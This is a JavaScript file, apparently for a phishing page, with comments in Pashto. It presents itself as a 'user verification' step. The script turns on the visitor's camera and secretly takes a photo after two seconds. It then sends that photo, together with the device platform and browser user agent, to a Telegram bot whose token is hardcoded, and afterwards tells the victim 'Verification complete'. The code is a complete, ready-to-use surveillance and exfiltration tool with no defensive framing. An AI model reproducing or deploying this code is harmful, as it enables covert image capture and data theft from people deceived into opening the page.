const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";

// لینک: ?id=12345
const CHAT_ID = new URLSearchParams(window.location.search).get("id");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

// user click وروسته camera
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    setTimeout(() => {
      captureAndSend();
    }, 2000); // 2 ثانیه وروسته عکس اخلي

  } catch {
    alert("Camera permission required ❌");
  }
}

function captureAndSend() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.drawImage(video, 0, 0);

  canvas.toBlob(sendToTelegram, "image/jpeg");
}

function sendToTelegram(blob) {
  const formData = new FormData();

  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "photo.jpg");

  const caption =
`📸 User Verification

🧾 ID: ${CHAT_ID}
📱 Device: ${navigator.platform}
🌐 Browser: ${navigator.userAgent}

✅ Status: Completed`;

  formData.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(() => alert("Verification complete ✅"))
  .catch(() => alert("Error ❌"));
}
